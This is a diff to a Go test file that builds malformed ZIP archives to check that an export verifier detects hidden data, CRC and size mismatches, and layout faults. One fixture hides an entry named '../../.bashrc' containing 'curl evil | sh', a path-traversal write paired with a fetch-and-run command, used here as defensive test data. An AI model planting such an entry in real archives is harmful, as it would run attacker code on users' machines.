@@ -3,7 +3,10 @@ package gobd
 import (
 	"archive/zip"
 	"bytes"
+	"compress/flate"
 	"encoding/binary"
+	"hash/crc32"
+	"io"
 	"os"
 	"path/filepath"
 	"strings"
@@ -326,6 +329,89 @@ func localHeaderZIPs(t testing.TB) map[string]struct {
 		data   []byte
 		detail string
 	}{t2, "data between the last entry and the central directory"}
+	// Round 2: data hidden inside an entry's compressed size, after the end
+	// of its Deflate stream (review A of #507, TestProbeDeflateTail, and B's
+	// probe (c)). Copied raw with archive/zip's own writer, so every record,
+	// descriptor and size is consistent; only the stream ends early.
+	fake := func(name string, content []byte) []byte {
+		var b bytes.Buffer
+		zw := zip.NewWriter(&b)
+		h := &zip.FileHeader{Name: name, Method: zip.Store, CRC32: crc32.ChecksumIEEE(content),
+			CompressedSize64: uint64(len(content)), UncompressedSize64: uint64(len(content))}
+		w, _ := zw.CreateRaw(h)
+		_, _ = w.Write(content)
+		_ = zw.Flush()
+		return b.Bytes() // the local entry only; Close would add a directory
+	}
+	rawCopy := func(name, detail string, edit func(fh *zip.FileHeader, raw []byte) []byte) {
+		zr, err := zip.NewReader(bytes.NewReader(clean), int64(len(clean)))
+		if err != nil {
+			t.Fatal(err)
+		}
+		var b bytes.Buffer
+		zw := zip.NewWriter(&b)
+		for _, zf := range zr.File {
+			r, err := zf.OpenRaw()
+			if err != nil {
+				t.Fatal(err)
+			}
+			raw, err := io.ReadAll(r)
+			if err != nil {
+				t.Fatal(err)
+			}
+			fh := zf.FileHeader
+			if zf.Name == ReadmeFile {
+				raw = edit(&fh, raw)
+				fh.CompressedSize64 = uint64(len(raw))
+			}
+			w, err := zw.CreateRaw(&fh)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if _, err := w.Write(raw); err != nil {
+				t.Fatal(err)
+			}
+		}
+		if err := zw.Close(); err != nil {
+			t.Fatal(err)
+		}
+		out[name] = struct {
+			data   []byte
+			detail string
+		}{b.Bytes(), detail}
+	}
+	rawCopy("entry hidden after the Deflate stream", "after the end of its Deflate stream", func(fh *zip.FileHeader, raw []byte) []byte {
+		desc := make([]byte, 16)
+		binary.LittleEndian.PutUint32(desc, 0x08074b50)
+		binary.LittleEndian.PutUint32(desc[4:], fh.CRC32)
+		binary.LittleEndian.PutUint32(desc[8:], uint32(len(raw)))               //nolint:gosec // a small test entry
+		binary.LittleEndian.PutUint32(desc[12:], uint32(fh.UncompressedSize64)) //nolint:gosec // a small test entry
+		return append(append(bytes.Clone(raw), desc...), fake("../../.bashrc", []byte("curl evil | sh\n"))...)
+	})
+	rawCopy("junk after the Deflate stream", "after the end of its Deflate stream", func(_ *zip.FileHeader, raw []byte) []byte {
+		return append(bytes.Clone(raw), "junk"...)
+	})
+	rawCopy("wrong CRC-32 in every record", "does not match its CRC-32", func(fh *zip.FileHeader, raw []byte) []byte {
+		fh.CRC32 ^= 1
+		return raw
+	})
+	rawCopy("wrong size in every record", "decompresses to fewer bytes than its records say", func(fh *zip.FileHeader, raw []byte) []byte {
+		fh.UncompressedSize64++
+		return raw
+	})
+	rawCopy("Store entry", "uses compression method 0, not Deflate", func(fh *zip.FileHeader, raw []byte) []byte {
+		r := flate.NewReader(bytes.NewReader(raw))
+		content, err := io.ReadAll(r)
+		if err != nil {
+			t.Fatal(err)
+		}
+		fh.Method = zip.Store
+		return content
+	})
+	// A local header with a CRC-32 although a data descriptor follows.
+	patch("local CRC with descriptor", "has a CRC-32 or sizes although a data descriptor follows", func(b []byte, at int) {
+		binary.LittleEndian.PutUint32(b[at+14:], 1)
+	})
 	return out
 }
 
@@ -339,7 +425,10 @@ func checkLocalHeaderCases(t *testing.T, f *fixture) {
 				t.Fatal(err)
 			}
 			fs, _ := verify(t, p, VerifyOptions{Trusted: f.trusted()})
-			if len(fs) != 1 || !hasFinding(fs, KindName, "not a readable export ZIP") || !hasFinding(fs, KindName, c.detail) {
+			// Layout cases refuse the whole ZIP (one finding); cases inside an
+			// entry's data name that entry.
+			whole := hasFinding(fs, KindName, "not a readable export ZIP")
+			if !hasFinding(fs, KindName, c.detail) || (whole && len(fs) != 1) || (!whole && !hasFinding(fs, KindName, ReadmeFile+" ")) {
 				t.Fatalf("want one name finding %q:\n%s", c.detail, strings.Join(kinds(fs), "\n"))
 			}
 		})
